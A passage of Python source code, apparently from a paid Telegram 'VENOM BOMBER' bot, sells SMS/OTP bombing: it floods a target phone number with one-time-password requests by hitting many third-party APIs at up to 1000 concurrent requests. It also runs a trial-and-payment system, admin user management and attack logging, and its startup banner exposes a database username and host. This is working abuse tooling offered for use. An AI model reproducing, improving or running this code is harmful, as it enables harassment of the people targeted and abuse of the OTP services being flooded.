    connector = aiohttp.TCPConnector(limit=max_concurrent, limit_per_host=max_concurrent)
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        end_timestamp = time.time() + duration
        
        # VENOM ATTACK LOOP
        while time.time() < end_timestamp and context.user_data.get('attacking', False):
            # Calculate remaining time
            remaining = end_timestamp - time.time()
            if remaining <= 0:
                break
            
            # Create tasks for ALL APIs at once
            tasks = []
            for api in APIS:
                if not context.user_data.get('attacking', False):
                    break
                
                # Call each API multiple times based on count
                for i in range(api.get('count', 1)):
                    if not context.user_data.get('attacking', False) or time.time() >= end_timestamp:
                        break
                    
                    task = asyncio.create_task(VENOM_api_call(session, api, phone, context))
                    tasks.append(task)
            
            # Execute ALL tasks concurrently - VENOM ATTACK!
            if tasks:
                try:
                    # Wait for all tasks with timeout
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Process results
                    for result in results:
                        if isinstance(result, dict):
                            # Update counters
                            if context.user_data.get('attacking', False):
                                context.user_data['total_requests'] = context.user_data.get('total_requests', 0) + 1
                                if result['success']:
                                    context.user_data['successful_requests'] = context.user_data.get('successful_requests', 0) + 1
                                else:
                                    context.user_data['failed_requests'] = context.user_data.get('failed_requests', 0) + 1
                                context.user_data['requests_since_last_update'] = context.user_data.get('requests_since_last_update', 0) + 1
                
                except Exception as e:
                    logger.debug(f"VENOM batch error: {e}")
            
            # Update RPS every 0.5 seconds for VENOM attack
            current_time = time.time()
            if current_time - context.user_data.get('last_rps_update', 0) >= 0.5:
                elapsed = current_time - context.user_data['last_rps_update']
                requests = context.user_data.get('requests_since_last_update', 0)
                rps = requests / elapsed if elapsed > 0 else 0
                context.user_data['last_rps'] = rps
                context.user_data['last_rps_update'] = current_time
                context.user_data['requests_since_last_update'] = 0
            
            # Update status every 1 second for VENOM attack
            if current_time - context.user_data.get('last_status_update', 0) >= 1:
                await update_VENOM_status(context, chat_id, message_id, phone, duration, is_trial)
                context.user_data['last_status_update'] = current_time
            
            # Minimal delay for VENOM attack
            if time.time() < end_timestamp:
                sleep_time = min(0.01, end_timestamp - time.time())
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
    
    # Attack finished
    attack_end = datetime.now()
    elapsed = (attack_end - attack_start).seconds
    
    # Update final status
    await update_VENOM_final_status(context, chat_id, message_id, phone, elapsed, speed_settings, is_trial)
    
    # Log attack
    await log_attack(
        user_id=update.effective_user.id,
        target_number=phone,
        duration=elapsed,
        requests_sent=context.user_data.get('total_requests', 0),
        success=context.user_data.get('successful_requests', 0),
        failed=context.user_data.get('failed_requests', 0),
        start_time=attack_start,
        end_time=attack_end,
        status="COMPLETED" if context.user_data.get('attacking', False) else "STOPPED",
        is_trial_attack=is_trial
    )
    
    # Clear attack flag
    context.user_data['attacking'] = False

async def update_VENOM_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, duration: int, is_trial: bool = False):
    """Update VENOM attack status message"""
    if not context.user_data.get('attacking', False):
        return
    
    try:
        current_time = time.time()
        attack_start_time = context.user_data['attack_start'].timestamp()
        elapsed = int(current_time - attack_start_time)
        remaining = max(0, duration - elapsed)
        
        # Calculate progress
        progress_percent = min(100, int((elapsed / duration) * 100))
        progress_bar_length = 20
        filled = int(progress_percent / 100 * progress_bar_length)
        progress_bar = "█" * filled + "░" * (progress_bar_length - filled)
        
        # Get current RPS
        current_rps = context.user_data.get('last_rps', 0.0)
        
        status_message = f"""
╔════════════════════════════════════════╗
║        ⚡💥 VENOM ATTACK ACTIVE       ║
╚════════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ TIME: {elapsed}s / {duration}s
📊 PROGRESS: {progress_bar} {progress_percent}%
⏳ REMAINING: {remaining}s

⚡ VENOM STATS:
├─ REQUESTS: {context.user_data.get('total_requests', 0)}
├─ SUCCESS: {context.user_data.get('successful_requests', 0)}
├─ FAILED: {context.user_data.get('failed_requests', 0)}
├─ RPS: {current_rps:.1f}
└─ APIS: {TOTAL_APIS}

📡 STATUS: ALL APIs FIRING SIMULTANEOUSLY
🕐 LAST UPDATE: {datetime.now().strftime('%H:%M:%S')}
"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=status_message
        )
    except Exception as e:
        logger.error(f"Failed to update VENOM status: {e}")

async def update_VENOM_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, elapsed: int, speed_settings: dict, is_trial: bool = False):
    """Update final VENOM attack status"""
    try:
        status = "✅ VENOM COMPLETED" if context.user_data.get('attacking', False) else "🛑 VENOM STOPPED"
        
        # Calculate success rate
        total = context.user_data.get('total_requests', 0)
        success = context.user_data.get('successful_requests', 0)
        success_rate = (success / total * 100) if total > 0 else 0
        
        # Calculate average RPS
        avg_rps = total / elapsed if elapsed > 0 else 0
        
        # Calculate OTPs per second
        otps_per_second = avg_rps / TOTAL_APIS if TOTAL_APIS > 0 else 0
        
        final_message = f"""
╔════════════════════════════════════════╗
║        ⚡💥 VENOM ATTACK RESULTS      ║
╚════════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {elapsed} seconds
📊 STATUS: {status}

📈 VENOM PERFORMANCE:
├─ TOTAL REQUESTS: {total}
├─ SUCCESSFUL: {success}
├─ FAILED: {context.user_data.get('failed_requests', 0)}
├─ SUCCESS RATE: {success_rate:.1f}%
├─ AVG RPS: {avg_rps:.1f}
├─ OTPS/SEC: {otps_per_second:.1f}
└─ TOTAL APIS: {TOTAL_APIS}

⚡ ATTACK SUMMARY:
├─ Mode: VENOM ATTACK (Maximum Speed)
├─ Strategy: All APIs firing simultaneously
├─ Concurrency: 100+ parallel requests
└─ Speed: Ultra High
"""
        
        if is_trial:
            final_message += f"""
⚠️ TRIAL STATUS:
├─ ❌ Your free trial is now PERMANENTLY USED
├─ 🔒 Trial access is NOW BLOCKED
├─ ⚠️ You cannot use trial again
├─ 💰 Contact admin for paid access
└─ 👑 @Venompratap
"""
        else:
            final_message += f"""
💡 NEXT ACTIONS:
├─ ⚡ Use /attack for new VENOM attack
├─ 🚀 Use /speed 5 for VENOM mode
└─ 📊 Use /stats for full statistics
"""
        
        final_message += f"""
🕐 TIME INFO:
├─ STARTED: {context.user_data['attack_start'].strftime('%H:%M:%S')}
└─ ENDED: {datetime.now().strftime('%H:%M:%S')}
"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_message
        )
    except Exception as e:
        logger.error(f"Failed to update VENOM final status: {e}")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current VENOM attack immediately"""
    user_id = update.effective_user.id
    
    if not context.user_data.get('attacking', False):
        await update.message.reply_text(
            "ℹ️ No active attack to stop.\n"
            "Use /trial for free trial or /attack for paid attack."
        )
        return
    
    # Get attack details before stopping
    target_phone = context.user_data.get('target_phone', 'Unknown')
    total_requests = context.user_data.get('total_requests', 0)
    successful_requests = context.user_data.get('successful_requests', 0)
    failed_requests = context.user_data.get('failed_requests', 0)
    attack_start = context.user_data.get('attack_start', datetime.now())
    is_trial = context.user_data.get('is_trial_attack', False)
    
    # Calculate elapsed time
    elapsed = (datetime.now() - attack_start).seconds
    
    # IMMEDIATELY stop the attack
    context.user_data['attacking'] = False
    
    # Calculate statistics
    success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
    avg_rps = total_requests / elapsed if elapsed > 0 else 0
    
    # Send immediate stop confirmation
    stop_message = f"""
╔═════════════════════════════════════╗
║      ⚡💥 VENOM ATTACK STOPPED     ║
╚═════════════════════════════════════╝

🎯 TARGET: {target_phone}
⏱️ DURATION: {elapsed} seconds
📊 STATUS: STOPPED MANUALLY

📈 VENOM STATS:
├─ TOTAL REQUESTS: {total_requests}
├─ SUCCESSFUL: {successful_requests}
├─ FAILED: {failed_requests}
├─ SUCCESS RATE: {success_rate:.1f}%
├─ AVG RPS: {avg_rps:.1f}
└─ TOTAL APIS: {TOTAL_APIS}

✅ VENOM attack has been completely stopped.
⚡ No further OTPs will be sent.
"""
    
    if is_trial:
        # Get trial info
        trial_info = await get_user_trial_info(user_id)
        
        stop_message += f"""
⚠️ TRIAL STATUS:
├─ ❌ Your ONE-TIME trial is now USED
├─ 🔒 Trial access is PERMANENTLY BLOCKED
├─ ⚠️ Cannot use trial again
├─ 💰 Contact admin for paid access
└─ 👑 @Venompratap
"""
    else:
        stop_message += f"""
💡 NEXT ACTIONS:
├─ ⚡ Use /attack for new VENOM attack
├─ 🚀 Use /speed 5 for VENOM mode
└─ 📊 Use /stats for full statistics
"""
    
    await update.message.reply_text(stop_message)
    
    # Also update the status message if it exists
    try:
        chat_id = context.user_data.get('status_chat_id')
        message_id = context.user_data.get('status_message_id')
        
        if chat_id and message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=stop_message
            )
    except Exception as e:
        logger.debug(f"Could not update status message: {e}")
    
    # Clear attack data
    attack_keys = [
        'target_phone', 'attack_duration', 'attack_start', 'attack_end',
        'total_requests', 'successful_requests', 'failed_requests',
        'status_message_id', 'status_chat_id', 'last_rps_update',
        'requests_since_last_update', 'last_rps', 'speed_settings',
        'last_status_update', 'is_trial_attack'
    ]
    
    for key in attack_keys:
        context.user_data.pop(key, None)

async def speed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle speed control command - Paid users only"""
    user_id = update.effective_user.id
    
    # Check if user is authorized (paid user)
    if not await is_user_authorized(user_id):
        trial_info = await get_user_trial_info(user_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    🔒 PAID FEATURE    ║
╚═══════════════════════╝

Speed control is available for PAID USERS only.

🎁 Your Trial Status:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: ❌ No

⚡ Trial Users Speed:
Speed is fixed at Level 5 (VENOM MODE) for trial.

💰 Contact Admin for Full Access:
@Venompratap
"""
        )
        return
    
    current_settings = await get_user_speed_settings(user_id)
    current_level = current_settings['speed_level']
    
    if not context.args:
        # Show current speed settings
        preset = SPEED_PRESETS[current_level]
        
        message = f"""
╔═══════════════════════╗
║     ⚡ SPEED LEVELS    ║
╚═══════════════════════╝

📊 Current Settings:
├─ Name: {preset['name']}
├─ Level: {current_level}
├─ Concurrent: {current_settings['max_concurrent']}
├─ Delay: {current_settings['delay']}s
└─ Description: {preset['description']}

🎯 Available Levels:
├─ 1️⃣ Level 1: 🐢 Very Slow
│   ├─ Concurrent: 30
│   └─ Delay: 0.5s
├─ 2️⃣ Level 2: 🚶 Slow
│   ├─ Concurrent: 50
│   └─ Delay: 0.3s
├─ 3️⃣ Level 3: ⚡ Medium
│   ├─ Concurrent: 100
│   └─ Delay: 0.1s
├─ 4️⃣ Level 4: 🚀 Fast
│   ├─ Concurrent: 200
│   └─ Delay: 0.05s
└─ 5️⃣ Level 5: ⚡💥 VENOM MODE
    ├─ Concurrent: 1000
    └─ Delay: 0.001s

💡 Usage: /speed <level>
📌 Example: /speed 5 for VENOM ATTACK
"""
        
        await update.message.reply_text(message)
        return
    
    # Set new speed level
    try:
        new_level = int(context.args[0])
        
        if new_level not in SPEED_PRESETS:
            await update.message.reply_text(
                """
╔═══════════════════════╗
║  ❌ INVALID LEVEL    ║
╚═══════════════════════╝

Please use level 1-5:
1️⃣ 🐢 Very Slow
2️⃣ 🚶 Slow
3️⃣ ⚡ Medium
4️⃣ 🚀 Fast
5️⃣ ⚡💥 VENOM MODE
"""
            )
            return
        
        # Apply preset
        preset = SPEED_PRESETS[new_level]
        new_settings = {
            'speed_level': new_level,
            'max_concurrent': preset['max_concurrent'],
            'delay': preset['delay']
        }
        
        await set_user_speed_settings(user_id, new_settings)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║   ✅ SPEED UPDATED   ║
╚═══════════════════════╝

📊 New Settings Applied:
├─ Name: {preset['name']}
├─ Level: {new_level}
├─ Concurrent: {preset['max_concurrent']}
├─ Delay: {preset['delay']}s
└─ Description: {preset['description']}

⚡ Next attack will use these settings.
"""
        )
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Use /speed to see settings or /speed 1-5 to change."
        )

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add paid user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /add <user_id> [username]\n"
            "Example: /add 1234567890 Username"
        )
        return
    
    try:
        target_id = int(context.args[0])
        username = context.args[1] if len(context.args) > 1 else "Unknown"
        
        # Clean the username
        clean_username = clean_text(username)
        
        # Add as paid user with trial blocked
        await add_authorized_user(target_id, clean_username, f"User {target_id}", user_id, True)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    ✅ USER ADDED     ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Username: {clean_username}
├─ Status: ✅ PAID USER
├─ Trial: ❌ PERMANENTLY BLOCKED
├─ Added by: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User can now use VENOM ATTACK with /attack
❌ Trial access is PERMANENTLY blocked
💰 User has full paid access
"""
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /remove <user_id>\n"
            "Example: /remove 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        await remove_authorized_user(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    ✅ USER REMOVED   ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Removed by: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

❌ User can no longer use VENOM ATTACK.
❌ Both trial and paid access removed.
❌ User needs to be re-added for access.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def reset_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /resettrial <user_id>\n"
            "Example: /resettrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Reset trial for user
        await reset_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║  ✅ TRIAL RESET      ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Reset
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User's trial has been reset.
✅ Trial counter set to 0.
✅ Trial access UNBLOCKED.
✅ Can use /trial again (ONE TIME ONLY).
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def block_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /blocktrial <user_id>\n"
            "Example: /blocktrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Block trial for user
        await block_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║  ✅ TRIAL BLOCKED    ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Blocked
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

❌ User's trial has been PERMANENTLY BLOCKED.
❌ Cannot use /trial command.
💰 Contact admin for paid access only.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def unblock_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /unblocktrial <user_id>\n"
            "Example: /unblocktrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Unblock trial for user
        await unblock_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║  ✅ TRIAL UNBLOCKED  ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Unblocked
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User's trial has been UNBLOCKED.
✅ Can use /trial command again.
⏰ ONE-TIME USE ONLY.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all authorized users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║ ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    users = await get_all_authorized_users()
    
    if not users:
        await update.message.reply_text("📭 No authorized users found.")
        return
    
    message = "╔══════════════════════════════════════╗\n"
    message += "║          📋 AUTHORIZED USERS        ║\n"
    message += "╚═════════════════════════════════════╝\n\n"
    
    for idx, (user_id, username, display_name, added_at, trial_count, last_trial, trial_blocked, is_paid) in enumerate(users, 1):
        status = "💰 PAID USER" if is_paid else "🎁 TRIAL USER"
        trial_status = "✅ ACTIVE" if not trial_blocked else "❌ PERMANENTLY BLOCKED"
        
        message += f"┌─👤 USER #{idx}\n"
        message += f"│\n"
        message += f"├─ ID: {user_id}\n"
        message += f"├─ Username: {username or 'N/A'}\n"
        message += f"├─ Display Name: {display_name or 'N/A'}\n"
        message += f"├─ Status: {status}\n"
        message += f"├─ Trials Used: {trial_count}\n"
        message += f"├─ Last Trial: {last_trial.split('T')[0] if last_trial else 'Never'}\n"
        message += f"├─ Trial Status: {trial_status}\n"
        message += f"└─ Added: {added_at}\n\n"
    
    message += f"📊 Total Users: {len(users)}"
    
    await update.message.reply_text(message)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        username = update.effective_user.username or "Not set"
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check trial availability
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
    
    stats_text = f"""
╔═════════════════════════════════════╗
║          📊 VENOM STATISTICS        ║
╚═════════════════════════════════════╝

👤 USER INFORMATION
├─ ID: {user_id}
├─ Name: {clean_first_name}
├─ Username: @{update.effective_user.username or "Not set"}

🎁 TRIAL INFORMATION
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
└─ Reason: {reason}

⚡ VENOM ATTACK INFO
├─ Total APIs: {TOTAL_APIS}
├─ Max Speed: Level 5 (VENOM MODE)
├─ Max Concurrency: 1000
└─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}

💰 ACCOUNT STATUS
├─ Status: {status}
"""
    
    if trial_allowed:
        stats_text += """
├─ ✅ Trial Available (ONE TIME ONLY)
├─ ⏰ Duration: 60 seconds
├─ 🔒 After trial: PERMANENTLY BLOCKED
├─ ⚠️ Cannot use trial again
└─ 💰 Contact admin for paid access
"""
    elif trial_info['is_paid_user']:
        stats_text += """
├─ ✅ Paid User
├─ ⚡ Unlimited attacks
├─ 🚀 All speed levels
├─ ⏰ Max duration: No limit
└─ 👑 Thank you for purchasing!
"""
    else:
        stats_text += """
├─ ❌ Trial Used
├─ 🔒 Trial PERMANENTLY blocked
├─ ⚠️ One-time trial already used
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @Venompratap
"""
    
    await update.message.reply_text(stats_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help menu"""
    user_id = update.effective_user.id
    trial_info = await get_user_trial_info(user_id)
    trial_allowed, _ = await can_user_use_trial(user_id)
    
    status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
    
    help_text = f"""
╔═════════════════════════════════════╗
║        ⚡💥 VENOM BOMBER HELP      ║
╚═════════════════════════════════════╝

👤 YOUR STATUS: {status}

⚡ VENOM ATTACK COMMANDS:
├─ /trial <number> - One-time free trial (60s)
├─ /mytrial - Check your trial status
├─ /attack <num> <time> - Paid VENOM attack
├─ /speed <1-5> - Set speed (5=VENOM Mode) - PAID ONLY
├─ /stop - Stop current attack
├─ /stats - View statistics
└─ /help - Show this menu

🎯 VENOM ATTACK FEATURES:
├─ Speed Level 5: VENOM MODE
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs: Unlimited during attack

⚠️ TRIAL RULES (STRICT - ONE TIME ONLY):
├─ ✅ Available: ONE TIME ONLY
├─ ⏰ Duration: 60 seconds
├─ ❌ After trial: PERMANENTLY BLOCKED
├─ 🔒 No further trial access
├─ 💰 Only paid access after trial
└─ 👑 Admin: @Venompratap
"""
    
    if is_admin(user_id):
        help_text += """
👑 ADMIN COMMANDS:
├─ /add <user_id> - Add paid user
├─ /remove <user_id> - Remove user
├─ /users - List all users
├─ /resettrial <user_id> - Reset user trial
├─ /blocktrial <user_id> - Permanently block trial
├─ /unblocktrial <user_id> - Unblock user trial
└─ /broadcast <msg> - Broadcast message
"""
    
    await update.message.reply_text(help_text)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /broadcast <message>\n"
            "Example: /broadcast Hello everyone!"
        )
        return
    
    message = ' '.join(context.args)
    users = await get_all_authorized_users()
    
    if not users:
        await update.message.reply_text("📭 No users to broadcast to.")
        return
    
    sent = 0
    failed = 0
    
    broadcast_msg = await update.message.reply_text(
        f"📢 Broadcasting to {len(users)} users...\n"
        f"✅ Sent: 0 | ❌ Failed: 0"
    )
    
    for user_id, username, _, _, _, _, _, _ in users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"""
╔═══════════════════════════════════════╗
║        📢 BROADCAST MESSAGE          ║
╚═══════════════════════════════════════╝

{message}

📅 Date: {datetime.now().strftime('%d %b %Y')}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}

👑 Sent by Admin
"""
            )
            sent += 1
        except Exception as e:
            failed += 1
            logger.error(f"Failed to send to {user_id}: {e}")
        
        # Update status every 5 sends
        if (sent + failed) % 5 == 0:
            try:
                await broadcast_msg.edit_text(
                    f"📢 Broadcasting to {len(users)} users...\n"
                    f"✅ Sent: {sent} | ❌ Failed: {failed}"
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        await asyncio.sleep(0.1)
    
    await broadcast_msg.edit_text(
        f"""
╔═══════════════════════════════════════╗
║         ✅ BROADCAST COMPLETE         ║
╚═══════════════════════════════════════╝

📊 Broadcast Results:
├─ Total Users: {len(users)}
├─ Successfully Sent: {sent}
└─ Failed: {failed}

📅 Date: {datetime.now().strftime('%d %b %Y')}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}
"""
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

async def post_init(application: Application):
    """Initialize MongoDB connection after bot starts"""
    await mongo.connect()

async def shutdown(application: Application):
    """Clean up MongoDB connection on shutdown"""
    await mongo.close()

def main():
    """Start the bot."""
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("trial", trial))
    application.add_handler(CommandHandler("mytrial", mytrial))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("speed", speed_command))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("resettrial", reset_trial))
    application.add_handler(CommandHandler("blocktrial", block_trial))
    application.add_handler(CommandHandler("unblocktrial", unblock_trial))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("broadcast", broadcast))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    print(f"""
╔════════════════════════════════════════════╗
║        ⚡💥 VENOM BOMBER BOT 💥⚡        ║
║           ULTIMATE SMS BOMBER              ║
╚════════════════════════════════════════════╝

📡 Bot Information:
├─🤖 Bot Token: Loaded
├─📊 Total APIs: {TOTAL_APIS}
├─⚡ Attack Mode: VENOM ATTACK
├─💾 Database: MongoDB (Cloud)
├─📀 Database URL: mongodb+srv://nikilsaxena843_db_user:****@vipbot.puv6gfk.mongodb.net
├─👑 Admin Users: {len(ADMIN_USER_IDS)}
└─🔥 Status: Starting...

⚡ VENOM ATTACK FEATURES:
├─ Speed: Level 5 (VENOM MODE)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Delay: 0.001 seconds
└─ OTPs: Maximum possible

⚠️ TRIAL SYSTEM (STRICT - ONE TIME ONLY):
├─ Frequency: ONE TIME ONLY
├─ Duration: 60 seconds
├─ After trial: PERMANENTLY BLOCKED
├─ No further trial access
└─ Only paid access available

🔧 Available Commands:
├─🎯 /start - Start bot
├─🆘 /help - Help menu
├─🎁 /trial - One-time free trial (60s)
├─📊 /mytrial - Check trial status
├─💥 /attack - Paid VENOM attack
├─⚡ /speed - Set speed (5=VENOM Mode) - PAID ONLY
├─📊 /stats - View statistics
├─🛑 /stop - Stop attack
├—🔄 /resettrial - Reset user trial (Admin)
├—🚫 /blocktrial - Block user trial (Admin)
├—✅ /unblocktrial - Unblock user trial (Admin)
├─➕ /add - Add paid user (Admin)
├─➖ /remove - Remove user (Admin)
├─📋 /users - List users (Admin)
└─📢 /broadcast - Broadcast (Admin)

🔥 BOT IS NOW RUNNING IN VENOM MODE!
Press Ctrl+C to stop
""")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
